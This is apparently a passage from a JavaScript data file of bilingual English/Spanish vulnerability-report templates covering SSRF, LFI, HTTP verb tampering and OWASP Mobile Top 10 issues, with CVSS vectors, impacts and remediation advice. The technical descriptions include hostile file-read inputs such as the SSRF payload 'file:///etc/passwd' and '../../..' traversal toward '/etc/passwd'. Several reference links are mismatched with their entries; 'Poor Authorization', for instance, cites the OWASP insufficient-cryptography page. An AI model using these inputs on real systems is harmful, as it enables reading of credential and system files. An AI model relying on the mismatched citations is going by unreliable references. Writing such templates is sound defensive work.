      recommendations_en: "### Recommendations\nImplement a whitelist of allowed domains and protocols. Disable redirects. Do not send raw responses from the server to the client. Ensure that the response from the internal service is parsed and validated.",
      recommendations_es: "### Recomendaciones\nImplementar una lista blanca de dominios y protocolos permitidos. Deshabilitar las redirecciones. No enviar respuestas sin procesar del servidor al cliente. Asegurarse de que la respuesta del servicio interno se analice y valide.",
      references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
      tags: ["Web", "SSRF"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-011",
      title_en: "HTTP Verb Tampering",
      title_es: "Manipulación de Verbos HTTP",
      cwe: "CWE-285",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nHTTP verb tampering involves bypassing access control mechanisms by changing the HTTP method (verb) of a request. For example, an application might enforce strict controls on POST requests but be more permissive with GET or other methods.",
      overview_es: "### Resumen\nLa manipulación de verbos HTTP implica eludir los mecanismos de control de acceso cambiando el método HTTP (verbo) de una solicitud. Por ejemplo, una aplicación podría aplicar controles estrictos a las solicitudes POST pero ser más permisiva con GET u otros métodos.",
      technicalDescription_en: "### Technical Description\nThe application's routing or access control logic does not properly restrict which HTTP verbs can be used for a given endpoint. An attacker can switch from a restricted verb (e.g., DELETE) to a less restricted one (e.g., GET or HEAD) to bypass security checks.",
      technicalDescription_es: "### Descripción Técnica\nLa lógica de enrutamiento o control de acceso de la aplicación no restringe adecuadamente qué verbos HTTP se pueden usar para un endpoint determinado. Un atacante puede cambiar de un verbo restringido (p. ej., DELETE) a uno menos restringido (p. ej., GET o HEAD) para eludir los controles de seguridad.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the endpoints vulnerable to verb tampering.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar los endpoints vulnerables a la manipulación de verbos.]",
      impact_en: "### Impact\nAttackers can bypass access controls to perform unauthorized actions, such as deleting resources, viewing sensitive information, or executing administrative functions.",
      impact_es: "### Impacto\nLos atacantes pueden eludir los controles de acceso para realizar acciones no autorizadas, como eliminar recursos, ver información sensible o ejecutar funciones administrativas.",
      recommendations_en: "### Recommendations\nConfigure the application to deny all requests for a given endpoint that do not use the intended HTTP method. Use a whitelist of allowed verbs for each endpoint.",
      recommendations_es: "### Recomendaciones\nConfigurar la aplicación para denegar todas las solicitudes para un endpoint determinado que no utilicen el método HTTP previsto. Usar una lista blanca de verbos permitidos para cada endpoint.",
      references: ["https://www.imperva.com/learn/application-security/http-verb-tampering/"],
      tags: ["Web", "Access Control"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-012",
      title_en: "Local File Inclusion (LFI)",
      title_es: "Inclusión de Archivos Locales (LFI)",
      cwe: "CWE-22",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nLFI is a vulnerability where an attacker can include files on a server through the web browser. The vulnerability exists due to the use of user-supplied input without proper validation, allowing the inclusion of local files.",
      overview_es: "### Resumen\nLFI es una vulnerabilidad en la que un atacante puede incluir archivos en un servidor a través del navegador web. La vulnerabilidad existe debido al uso de la entrada proporcionada por el usuario sin la validación adecuada, lo que permite la inclusión de archivos locales.",
      technicalDescription_en: "### Technical Description\nThe application uses a parameter (e.g., a filename in a URL) to include a file for rendering or processing. An attacker can manipulate this parameter using path traversal sequences (e.g., `../../..`) to include arbitrary files from the server's filesystem, such as `/etc/passwd`.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación utiliza un parámetro (p. ej., un nombre de archivo en una URL) para incluir un archivo para su representación o procesamiento. Un atacante puede manipular este parámetro utilizando secuencias de salto de directorio (p. ej., `../../..`) para incluir archivos arbitrarios del sistema de archivos del servidor, como `/etc/passwd`.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that includes files based on user input, e.g., language selection, template rendering.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que incluye archivos según la entrada del usuario, p. ej., selección de idioma, renderizado de plantillas.]",
      impact_en: "### Impact\nLFI can lead to the disclosure of sensitive information, such as application source code, credentials, and system configuration files. In some cases, it can be escalated to remote code execution.",
      impact_es: "### Impacto\nLFI puede conducir a la divulgación de información sensible, como el código fuente de la aplicación, credenciales y archivos de configuración del sistema. En algunos casos, se puede escalar a la ejecución remota de código.",
      recommendations_en: "### Recommendations\nAvoid passing user-supplied input to filesystem APIs. If necessary, use a whitelist of allowed filenames and validate the input to ensure it does not contain path traversal characters. Run the application with the minimum required privileges.",
      recommendations_es: "### Recomendaciones\nEvitar pasar la entrada proporcionada por el usuario a las API del sistema de archivos. Si es necesario, usar una lista blanca de nombres de archivo permitidos y validar la entrada para asegurarse de que no contenga caracteres de salto de directorio. Ejecutar la aplicación con los privilegios mínimos requeridos.",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"],
      tags: ["Web", "File Inclusion"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-013",
      title_en: "SSRF to Local File Read",
      title_es: "SSRF para Lectura de Archivos Locales",
      cwe: "CWE-918",
      severity: "High",
      cvss: { score: 8.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nA specific variant of Server-Side Request Forgery (SSRF) where the vulnerability can be leveraged to read arbitrary local files on the server by using the `file://` protocol handler in the user-supplied URL.",
      overview_es: "### Resumen\nUna variante específica de la Falsificación de Solicitudes del Lado del Servidor (SSRF) donde la vulnerabilidad se puede aprovechar para leer archivos locales arbitrarios en el servidor utilizando el manejador de protocolo `file://` en la URL proporcionada por el usuario.",
      technicalDescription_en: "### Technical Description\nThe application accepts a URL from the user and fetches its content. The input validation does not block the `file://` scheme. An attacker can provide a payload like `file:///etc/passwd` to make the server read this local file and return its content in the HTTP response.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación acepta una URL del usuario y obtiene su contenido. La validación de la entrada no bloquea el esquema `file://`. Un atacante puede proporcionar una carga útil como `file:///etc/passwd` para hacer que el servidor lea este archivo local y devuelva su contenido en la respuesta HTTP.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that fetches resources from a user-supplied URL, e.g., webhooks, PDF generators, image downloaders.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que obtiene recursos de una URL proporcionada por el usuario, p. ej., webhooks, generadores de PDF, descargadores de imágenes.]",
      impact_en: "### Impact\nThis allows an attacker to read sensitive files from the server's filesystem, including source code, configuration files, and credentials, leading to a full system compromise.",
      impact_es: "### Impacto\nEsto permite a un atacante leer archivos sensibles del sistema de archivos del servidor, incluido el código fuente, los archivos de configuración y las credenciales, lo que lleva a un compromiso total del sistema.",
      recommendations_en: "### Recommendations\nImplement a strict whitelist of allowed protocols (e.g., only HTTP and HTTPS). Validate that the user-supplied URL points to an external, public resource. Disable redirects.",
      recommendations_es: "### Recomendaciones\nImplementar una lista blanca estricta de protocolos permitidos (p. ej., solo HTTP y HTTPS). Validar que la URL proporcionada por el usuario apunte a un recurso externo y público. Deshabilitar las redirecciones.",
      references: ["https://portswigger.net/web-security/ssrf"],
      tags: ["Web", "SSRF", "File Read"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-014",
      title_en: "Insecure Data Storage",
      title_es: "Almacenamiento Inseguro de Datos",
      cwe: "CWE-312",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThis vulnerability covers the insecure storage of sensitive data on the mobile device. An attacker with physical access to the device or malware on the device could potentially access and steal this data.",
      overview_es: "### Resumen\nEsta vulnerabilidad cubre el almacenamiento inseguro de datos sensibles en el dispositivo móvil. Un atacante con acceso físico al dispositivo o malware en el dispositivo podría acceder y robar estos datos.",
      technicalDescription_en: "### Technical Description\nSensitive information such as user credentials, session tokens, or personal data is stored in insecure locations like SharedPreferences, plist files, or SQLite databases without encryption. These files can be accessed by other malicious apps on a rooted/jailbroken device or by an attacker with physical access.",
      technicalDescription_es: "### Descripción Técnica\nLa información sensible como credenciales de usuario, tokens de sesión o datos personales se almacena en ubicaciones inseguras como SharedPreferences, archivos plist o bases de datos SQLite sin cifrado. Otros aplicaciones maliciosas en un dispositivo rooteado/con jailbreak o un atacante con acceso físico pueden acceder a estos archivos.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the file(s) and location(s) where sensitive data is stored, e.g., /data/data/com.app.name/shared_prefs/user.xml]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el/los archivo(s) y la(s) ubicación(es) donde se almacenan los datos sensibles, p. ej., /data/data/com.app.name/shared_prefs/user.xml]",
      impact_en: "### Impact\nAn attacker can steal sensitive user data, leading to account compromise, identity theft, and other privacy violations.",
      impact_es: "### Impacto\nUn atacante puede robar datos sensibles del usuario, lo que lleva al compromiso de la cuenta, robo de identidad y otras violaciones de la privacidad.",
      recommendations_en: "### Recommendations\nDo not store sensitive data on the device if possible. If necessary, use platform-provided secure storage mechanisms like the Android Keystore and iOS Keychain. Encrypt all sensitive data before storing it.",
      recommendations_es: "### Recomendaciones\nNo almacenar datos sensibles en el dispositivo si es posible. Si es necesario, utilizar mecanismos de almacenamiento seguro proporcionados por la plataforma como el Keystore de Android y el Keychain de iOS. Cifrar todos los datos sensibles antes de almacenarlos.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage"],
      tags: ["Mobile", "Data Storage"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-015",
      title_en: "Weak Server-Side Controls",
      title_es: "Controles Débiles en el Servidor",
      cwe: "CWE-602",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nMobile applications are often just clients to a backend server. This vulnerability category covers all the 'classic' web service vulnerabilities that might occur on the server-side, which are then exploitable via the mobile app.",
      overview_es: "### Resumen\nLas aplicaciones móviles a menudo son solo clientes de un servidor backend. Esta categoría de vulnerabilidad cubre todas las vulnerabilidades 'clásicas' de servicios web que pueden ocurrir en el lado del servidor, las cuales son explotables a través de la aplicación móvil.",
      technicalDescription_en: "### Technical Description\nThe backend APIs that the mobile app communicates with are vulnerable to issues like SQL Injection, Broken Access Control, or SSRF. Because mobile clients can be easily analyzed and modified, attackers can often send malicious requests to the backend APIs directly, bypassing any client-side controls.",
      technicalDescription_es: "### Descripción Técnica\nLas API de backend con las que se comunica la aplicación móvil son vulnerables a problemas como inyección SQL, control de acceso roto o SSRF. Debido a que los clientes móviles pueden ser analizados y modificados fácilmente, los atacantes a menudo pueden enviar solicitudes maliciosas directamente a las API de backend, eludiendo cualquier control del lado del cliente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable backend API endpoint and the specific vulnerability, e.g., /api/v1/user/{id} is vulnerable to IDOR.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el endpoint de la API de backend vulnerable y la vulnerabilidad específica, p. ej., /api/v1/user/{id} es vulnerable a IDOR.]",
      impact_en: "### Impact\nThe impact is equivalent to the corresponding web vulnerability and can range from information disclosure to full system compromise.",
      impact_es: "### Impacto\nEl impacto es equivalente a la vulnerabilidad web correspondiente y puede variar desde la divulgación de información hasta el compromiso total del sistema.",
      recommendations_en: "### Recommendations\nTreat the mobile application as an untrusted client. Implement all security controls on the server-side, including input validation, access control, and strong authentication. Do not rely on any client-side validation.",
      recommendations_es: "### Recomendaciones\nTratar la aplicación móvil como un cliente no confiable. Implementar todos los controles de seguridad en el lado del servidor, incluida la validación de entradas, el control de acceso y la autenticación fuerte. No confiar en ninguna validación del lado del cliente.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage"],
      tags: ["Mobile", "API Security"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-016",
      title_en: "Insufficient Transport Layer Protection",
      title_es: "Protección Insuficiente de la Capa de Transporte",
      cwe: "CWE-319",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nData is transmitted between the mobile app and the backend server without adequate encryption. This allows an attacker on the same network to intercept, read, and potentially modify the traffic.",
      overview_es: "### Resumen\nLos datos se transmiten entre la aplicación móvil y el servidor backend sin un cifrado adecuado. Esto permite que un atacante en la misma red intercepte, lea y potencialmente modifique el tráfico.",
      technicalDescription_en: "### Technical Description\nThe application communicates with the server over plain HTTP, uses a weak SSL/TLS cipher suite, or fails to properly validate the server's certificate. An attacker can perform a Man-in-the-Middle (MitM) attack to capture sensitive data.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación se comunica con el servidor a través de HTTP plano, utiliza un conjunto de cifrado SSL/TLS débil o no valida correctamente el certificado del servidor. Un atacante puede realizar un ataque de intermediario (MitM) para capturar datos sensibles.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the endpoints using insecure transport protocols.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar los endpoints que utilizan protocolos de transporte inseguros.]",
      impact_en: "### Impact\nAn attacker can intercept sensitive information such as login credentials, session tokens, and personal data.",
      impact_es: "### Impacto\nUn atacante puede interceptar información sensible como credenciales de inicio de sesión, tokens de sesión y datos personales.",
      recommendations_en: "### Recommendations\nEnforce the use of TLS 1.2 or higher for all network communications. Implement certificate pinning to prevent MitM attacks. Use strong, industry-standard cipher suites.",
      recommendations_es: "### Recomendaciones\nForzar el uso de TLS 1.2 o superior para todas las comunicaciones de red. Implementar anclaje de certificados (certificate pinning) para prevenir ataques MitM. Utilizar conjuntos de cifrado sólidos y estándar de la industria.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication"],
      tags: ["Mobile", "Network"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-017",
      title_en: "Unintended Data Leakage",
      title_es: "Fuga de Datos no Intencionada",
      cwe: "CWE-200",
      severity: "Medium",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
      overview_en: "### Overview\nSensitive data is leaked by the mobile application to various places, such as system logs, cloud storage, or through insecure inter-process communication (IPC).",
      overview_es: "### Resumen\nLa aplicación móvil filtra datos sensibles a varios lugares, como registros del sistema, almacenamiento en la nube o a través de comunicación entre procesos (IPC) insegura.",
      technicalDescription_en: "### Technical Description\nThe application writes sensitive information to system logs (e.g., Logcat on Android), which can be read by other applications. It might also cache screenshots of sensitive screens or leak data through insecure IPC mechanisms like broadcast intents.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación escribe información sensible en los registros del sistema (p. ej., Logcat en Android), que pueden ser leídos por otras aplicaciones. También podría almacenar en caché capturas de pantalla de pantallas sensibles o filtrar datos a través de mecanismos IPC inseguros como los broadcast intents.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the source of the data leakage, e.g., system logs, keyboard cache, insecure IPC.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la fuente de la fuga de datos, p. ej., registros del sistema, caché del teclado, IPC inseguro.]",
      impact_en: "### Impact\nThis can lead to the exposure of sensitive user or application data to other apps on the device or to an attacker with physical access.",
      impact_es: "### Impacto\nEsto puede llevar a la exposición de datos sensibles del usuario o de la aplicación a otras aplicaciones en el dispositivo o a un atacante con acceso físico.",
      recommendations_en: "### Recommendations\nDisable logging in production builds. Avoid storing sensitive data in insecure locations. Use secure IPC mechanisms and properly configure content providers and intents.",
      recommendations_es: "### Recomendaciones\nDeshabilitar el registro en las compilaciones de producción. Evitar almacenar datos sensibles en ubicaciones inseguras. Utilizar mecanismos IPC seguros y configurar correctamente los proveedores de contenido y los intents.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication"],
      tags: ["Mobile", "Data Leakage"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-018",
      title_en: "Poor Authorization",
      title_es: "Autorización Deficiente",
      cwe: "CWE-285",
      severity: "High",
      cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
      overview_en: "### Overview\nThis is the mobile equivalent of Broken Access Control. The application fails to properly enforce authorization checks on the client-side, allowing users to access functionality they should not be able to.",
      overview_es: "### Resumen\nEste es el equivalente móvil del Control de Acceso Roto. La aplicación no aplica correctamente las comprobaciones de autorización en el lado del cliente, lo que permite a los usuarios acceder a funcionalidades a las que no deberían poder acceder.",
      technicalDescription_en: "### Technical Description\nThe application might hide UI elements for administrative functions from regular users, but an attacker can bypass these client-side checks. For example, by using reverse engineering tools like Frida, an attacker can enable hidden buttons or call restricted functions directly.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación puede ocultar elementos de la interfaz de usuario para funciones administrativas a los usuarios normales, pero un atacante puede eludir estas comprobaciones del lado del cliente. Por ejemplo, utilizando herramientas de ingeniería inversa como Frida, un atacante puede habilitar botones ocultos o llamar a funciones restringidas directamente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the client-side functionality that can be accessed by unauthorized users.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad del lado del cliente a la que pueden acceder usuarios no autorizados.]",
      impact_en: "### Impact\nAn attacker can perform administrative actions or access data belonging to other users.",
      impact_es: "### Impacto\nUn atacante puede realizar acciones administrativas o acceder a datos pertenecientes a otros usuarios.",
      recommendations_en: "### Recommendations\nAll authorization checks must be performed on the server-side. The client should be treated as an untrusted environment. Do not rely on hidden UI elements for security.",
      recommendations_es: "### Recomendaciones\nTodas las comprobaciones de autorización deben realizarse en el lado del servidor. El cliente debe ser tratado como un entorno no confiable. No confiar en elementos de la interfaz de usuario ocultos para la seguridad.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography"],
      tags: ["Mobile", "Authorization"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-019",
      title_en: "Broken Cryptography",
      title_es: "Criptografía Rota",
      cwe: "CWE-327",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application uses weak or outdated cryptographic algorithms, or implements cryptography incorrectly, allowing an attacker to decrypt sensitive data.",
      overview_es: "### Resumen\nLa aplicación utiliza algoritmos criptográficos débiles u obsoletos, o implementa la criptografía incorrectamente, lo que permite a un atacante descifrar datos sensibles.",
      technicalDescription_en: "### Technical Description\nThe application might use a weak algorithm like DES or MD5, use a hardcoded encryption key, or use a cryptographic primitive incorrectly (e.g., using ECB mode for block ciphers). An attacker can exploit these weaknesses to recover the plaintext data.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación podría usar un algoritmo débil como DES o MD5, usar una clave de cifrado embebida en el código, o usar una primitiva criptográfica incorrectamente (p. ej., usar el modo ECB para cifrados por bloques). Un atacante puede explotar estas debilidades para recuperar los datos en texto plano.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that uses weak cryptography, e.g., data encryption, password hashing.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que utiliza criptografía débil, p. ej., cifrado de datos, hashing de contraseñas.]",
      impact_en: "### Impact\nAn attacker can decrypt sensitive information, leading to data breaches and account compromise.",
      impact_es: "### Impacto\nUn atacante puede descifrar información sensible, lo que conduce a violaciones de datos y compromiso de cuentas.",
      recommendations_en: "### Recommendations\nUse strong, industry-standard cryptographic algorithms (e.g., AES-256-GCM, SHA-256). Do not hardcode cryptographic keys. Use well-vetted cryptographic libraries and follow best practices for their use.",
      recommendations_es: "### Recomendaciones\nUtilizar algoritmos criptográficos sólidos y estándar de la industria (p. ej., AES-256-GCM, SHA-256). No embeber claves criptográficas en el código. Utilizar bibliotecas criptográficas bien examinadas y seguir las mejores prácticas para su uso.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m6-insecure-authorization"],
      tags: ["Mobile", "Cryptography"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-020",
      title_en: "Client-Side Injection",
      title_es: "Inyección en el Lado del Cliente",
      cwe: "CWE-74",
      severity: "Medium",
      cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nThis category includes vulnerabilities like SQL injection, XSS, and command injection that occur on the client-side, often within a WebView component or a local SQLite database.",
      overview_es: "### Resumen\nEsta categoría incluye vulnerabilidades como inyección SQL, XSS e inyección de comandos que ocurren en el lado del cliente, a menudo dentro de un componente WebView o una base de datos SQLite local.",
      technicalDescription_en: "### Technical Description\nThe application processes user input in an unsafe way on the client-side. For example, a vulnerable WebView might be susceptible to XSS if it loads untrusted web content. A local SQLite database could be vulnerable to SQL injection if it constructs queries with unvalidated input.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación procesa la entrada del usuario de manera insegura en el lado del cliente. Por ejemplo, un WebView vulnerable podría ser susceptible a XSS si carga contenido web no confiable. Una base deatos SQLite local podría ser vulnerable a la inyección SQL si construye consultas con entradas no validadas.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the client-side component vulnerable to injection, e.g., WebView, local database.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el componente del lado del cliente vulnerable a la inyección, p. ej., WebView, base de datos local.]",
      impact_en: "### Impact\nClient-side injection can lead to data theft from the local application, unauthorized actions, and in some cases, remote code execution within the context of the app.",
      impact_es: "### Impacto\nLa inyección del lado del cliente puede llevar al robo de datos de la aplicación local, acciones no autorizadas y, en algunos casos, a la ejecución remota de código en el contexto de la aplicación.",
      recommendations_en: "### Recommendations\nValidate all user input, even if it is only used on the client-side. Use parameterized queries for local databases. Configure WebViews securely and avoid loading untrusted content.",
      recommendations_es: "### Recomendaciones\nValidar todas las entradas del usuario, incluso si solo se usan en el lado del cliente. Usar consultas parametrizadas para las bases de datos locales. Configurar los WebViews de forma segura y evitar cargar contenido no confiable.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m7-client-code-quality"],
      tags: ["Mobile", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-021",
      title_en: "Security Decisions Via Untrusted Inputs",
      title_es: "Decisiones de Seguridad a través de Entradas no Confiables",
      cwe: "CWE-807",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nThe application makes security-related decisions based on input from the user or the environment, which can be manipulated by an attacker.",
      overview_es: "### Resumen\nLa aplicación toma decisiones relacionadas con la seguridad basándose en la entrada del usuario o del entorno, que puede ser manipulada por un atacante.",
      technicalDescription_en: "### Technical Description\nThe application trusts data from an insecure source to perform a security-sensitive action. For example, it might use a URL parameter to decide which user's data to display, or trust a value from a file on the SD card.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación confía en datos de una fuente insegura para realizar una acción sensible a la seguridad. Por ejemplo, podría usar un parámetro de URL para decidir qué datos de usuario mostrar, o confiar en un valor de un archivo en la tarjeta SD.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that makes a security decision based on untrusted input.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que toma una decisión de seguridad basada en una entrada no confiable.]",
      impact_en: "### Impact\nThis can lead to authorization bypass, information disclosure, and other security control failures.",
      impact_es: "### Impacto\nEsto puede llevar a la omisión de la autorización, la divulgación de información y otros fallos en los controles de seguridad.",
      recommendations_en: "### Recommendations\nNever trust input from the client-side for security decisions. All security checks and decisions must be made on the server-side.",
      recommendations_es: "### Recomendaciones\nNunca confiar en la entrada del lado del cliente para las decisiones de seguridad. Todas las comprobaciones y decisiones de seguridad deben realizarse en el lado del servidor.",
      references: ["https://cwe.mitre.org/data/definitions/807.html"],
      tags: ["Mobile", "Access Control"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-022",
      title_en: "Reverse Engineering",
      title_es: "Ingeniería Inversa",
      cwe: "CWE-507",
      severity: "Medium",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nAn attacker can decompile or disassemble the mobile application binary to understand its inner workings, discover hidden functionality, or extract sensitive information like API keys or cryptographic secrets.",
      overview_es: "### Resumen\nUn atacante puede descompilar o desensamblar el binario de la aplicación móvil para comprender su funcionamiento interno, descubrir funcionalidades ocultas o extraer información sensible como claves de API o secretos criptográficos.",
      technicalDescription_en: "### Technical Description\nMobile application code, especially for Android, is relatively easy to decompile back to a human-readable format. An attacker can use tools like `jadx` or `Ghidra` to analyze the code, identify vulnerabilities, and find hardcoded secrets.",
      technicalDescription_es: "### Descripción Técnica\nEl código de las aplicaciones móviles, especialmente para Android, es relativamente fácil de descompilar a un formato legible por humanos. Un atacante puede usar herramientas como `jadx` o `Ghidra` para analizar el código, identificar vulnerabilidades y encontrar secretos embebidos en el código.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify what sensitive information was found via reverse engineering, e.g., hardcoded API key, proprietary algorithm.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar qué información sensible se encontró a través de la ingeniería inversa, p. ej., clave de API embebida, algoritmo propietario.]",
      impact_en: "### Impact\nReverse engineering can facilitate the discovery of other vulnerabilities, expose intellectual property, and reveal hardcoded secrets that can be used to attack backend systems.",
      impact_es: "### Impacto\nLa ingeniería inversa puede facilitar el descubrimiento de otras vulnerabilidades, exponer propiedad intelectual y revelar secretos embebidos que pueden ser utilizados para atacar sistemas backend.",
      recommendations_en: "### Recommendations\nUse code obfuscation tools like ProGuard (for Android) or commercial solutions to make reverse engineering more difficult. Avoid hardcoding any sensitive information in the client-side code.",
      recommendations_es: "### Recomendaciones\nUtilizar herramientas de ofuscación de código como ProGuard (para Android) o soluciones comerciales para dificultar la ingeniería inversa. Evitar embeber cualquier información sensible en el código del lado del cliente.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m9-reverse-engineering"],
      tags: ["Mobile", "Reverse Engineering"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-023",
      title_en: "Extraneous Functionality",
      title_es: "Funcionalidad Superflua",
      cwe: "CWE-912",
      severity: "Low",
      cvss: { score: 4.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application binary contains hidden or unused functionality, such as a debug menu or administrative endpoints, that could be abused by an attacker.",
      overview_es: "### Resumen\nEl binario de la aplicación contiene funcionalidades ocultas o no utilizadas, como un menú de depuración o endpoints administrativos, que podrían ser abusados por un atacante.",
      technicalDescription_en: "### Technical Description\nAttackers can discover this hidden functionality through reverse engineering. For example, a production build of an app might still contain code for a debug console or a backdoor account left by developers. An attacker can enable this functionality to bypass security controls.",
      technicalDescription_es: "### Descripción Técnica\nLos atacantes pueden descubrir esta funcionalidad oculta a través de la ingeniería inversa. Por ejemplo, una compilación de producción de una aplicación aún podría contener código para una consola de depuración o una cuenta de puerta trasera dejada por los desarrolladores. Un atacante puede habilitar esta funcionalidad para eludir los controles de seguridad.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the hidden functionality that was discovered, e.g., a hidden admin panel, a backdoor user account.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir la funcionalidad oculta que se descubrió, p. ej., un panel de administración oculto, una cuenta de usuario de puerta trasera.]",
      impact_en: "### Impact\nThis could lead to unauthorized access, information disclosure, or provide a convenient backdoor for an attacker.",
